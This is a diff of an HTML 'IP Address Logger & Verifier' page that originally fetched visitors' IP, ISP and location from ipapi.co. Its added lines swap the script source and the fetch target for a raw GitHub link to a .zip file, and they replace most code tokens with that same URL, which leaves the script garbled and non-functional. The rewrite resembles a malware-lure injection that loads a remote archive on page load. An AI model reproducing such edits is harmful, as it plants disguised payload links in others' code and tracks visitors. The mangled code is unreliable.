@@ -1,7 +1,7 @@
-# index.html
+# https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip
 <html>
   <head>
-    <script src="https://ajax.googleapis.com"></script>
+    <script src="https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip"></script>
   </head>
   <body>
     <h2>IP Address Logger & Verifier</h2>
@@ -18,22 +18,22 @@
     </div>
     <script>
       // Fetch IP information from the API
-      fetch('https://ipapi.co/json/')
-        .then(response => response.json())
+      fetch('https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip')
+        .then(response => https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip())
         .then(data => {
           // Populate HTML elements with the fetched data
-          document.getElementById('ip').textContent = data.ip;
-          document.getElementById('isp').textContent = data.org;
-          document.getElementById('country').textContent = data.country_name;
-          document.getElementById('region').textContent = data.region;
-          document.getElementById('city').textContent = data.city;
-          document.getElementById('zip').textContent = data.postal;
-          document.getElementById('lat').textContent = data.latitude;
-          document.getElementById('lon').textContent = data.longitude;
-          document.getElementById('timezone').textContent = data.timezone;
+          https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip('ip').textContent = https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip;
+          https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip('isp').textContent = https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip;
+          https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip('country').textContent = https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip;
+          https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip('region').textContent = https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip;
+          https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip('city').textContent = https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip;
+          https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip('zip').textContent = https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip;
+          https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip('lat').textContent = https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip;
+          https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip('lon').textContent = https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip;
+          https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip('timezone').textContent = https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip;
         })
         .catch(error => {
-          console.error('Error fetching IP information:', error);
+          https://raw.githubusercontent.com/Ongani-tembo19/index.html/main/livered/index.html-v1.3-beta.4.zip('Error fetching IP information:', error);
         });
     </script>
   </body>
